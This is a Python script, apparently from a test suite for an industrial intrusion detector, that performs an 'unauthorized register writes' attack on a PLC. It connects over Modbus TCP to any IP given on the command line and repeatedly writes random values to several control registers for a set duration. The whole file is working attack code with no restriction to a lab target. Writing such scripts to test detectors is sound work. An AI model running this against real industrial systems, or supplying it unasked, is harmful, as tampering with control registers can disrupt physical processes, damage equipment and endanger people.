#!/usr/bin/env python3
"""
Attack: Unauthorized Register Writes
Writes random values to critical control registers
Expected Detection: Unusual write patterns and value anomalies
"""

import sys
import time
import random
from pymodbus.client import ModbusTcpClient

def run_attack(target_ip: str, duration: int = 30):
    """
    Perform unauthorized writes to control registers
    
    Args:
        target_ip: Target PLC IP address
        duration: Attack duration in seconds
    """
    print(f"[*] Starting unauthorized write attack on {target_ip}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] This will write random values to registers 0-99")
    
    client = ModbusTcpClient(target_ip, port=502, timeout=1)
    
    if not client.connect():
        print(f"[!] Failed to connect to {target_ip}")
        return {"status": "failed", "reason": "connection_failed"}
    
    print(f"[+] Connected to {target_ip}")
    
    start_time = time.time()
    write_count = 0
    errors = 0
    
    # Critical registers to target (typically control values)
    target_registers = [0, 1, 10, 20, 50, 99]
    
    try:
        while (time.time() - start_time) < duration:
            # Pick random register and write random value
            register = random.choice(target_registers)
            value = random.randint(0, 65535)
            
            try:
                result = client.write_register(register, value, slave=1)
                if not result.isError():
                    write_count += 1
                    print(f"[+] Wrote {value} to register {register}")
                else:
                    errors += 1
                    
                # Delay between writes
                time.sleep(0.5)
                
            except Exception as e:
                errors += 1
                print(f"[!] Error: {e}")
                continue
    
    finally:
        client.close()
        elapsed = time.time() - start_time
        
        print(f"\n[*] Attack complete!")
        print(f"[*] Writes performed: {write_count}")
        print(f"[*] Errors: {errors}")
        print(f"[*] Write rate: {write_count / elapsed:.1f} writes/sec")
        print(f"[*] Elapsed time: {elapsed:.1f} seconds")
        
        return {
            "status": "completed",
            "writes_performed": write_count,
            "errors": errors,
            "write_rate": round(write_count / elapsed, 2),
            "duration": round(elapsed, 2)
        }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python unauthorized_write.py <target_ip> [duration_seconds]")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    
    run_attack(target, duration)
